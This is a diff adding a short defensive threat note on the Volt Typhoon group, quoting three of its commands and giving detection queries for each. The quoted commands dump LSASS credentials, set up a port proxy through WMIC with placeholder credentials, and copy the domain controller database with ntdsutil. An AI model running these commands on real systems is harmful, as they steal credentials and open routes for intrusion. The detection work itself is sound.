@@ -1,0 +1,39 @@
+What is Volt Typhoon
+- Reported to be a state-sponsored TA from China targetting US Critial Infra
+
+"Call to fame" of sorts
+LOL techniques focusing on data exfiltration since 2021
+
+3 main command lines to compromise and exfiltrate data from victim machine: 
+
+Dump Credentials from LSASS
+- rundll32.exe c:\windows\system32\comsvcs.dll, MiniDump 552 c:\windows\Temp\vmware-vhost.dmp full 
+
+Create Proxies on compromised systems to facilicate access
+- wmic /node:<node1> /user:<user1> /password:<password1> process call create "cmd.exe /c netsh interface portproxy add v4to4v listenport:50100 listenaddress=0.0.0.0 connectport=<remoteport1> connectaddress=<remoteip1>"
+
+Create install media from domain controllers
+- cmd.exe /c ntdsutil "ac i ntds" ifm "create full c:\Windows\Temp\pro" q q
+
+
+Queries to search for Volt Typhoon in your environment: 
+
+Track credential access: 
+((modload_name:comsvcs.dll process_cmdline:minidump))
+
+Track WMIC Process Exectuion
+(((process_name:wmic.exe process_cmdline:"process\ call\ create") AND -process_cmdline:launchedunelevatedchromeprocess.id))
+
+Track install media creation: 
+((process_cmdline: ntdsutil.exe OR process_cmdline: ntdsutil) AND process_cmdline: create process_cmdline:full) 
+
+
+
+References: 
+https://www.techrepublic.com/article/volt-typhoon-global-cyberwar/
+https://www.reuters.com/technology/chinese-groups-accused-hacking-microsoft-us-others-2023-05-25/
+https://community.carbonblack.com/t5/Threat-Research-Docs/Volt-Typhoon-Targeted-Attack/ta-p/118623
+https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a
+https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/
+
+
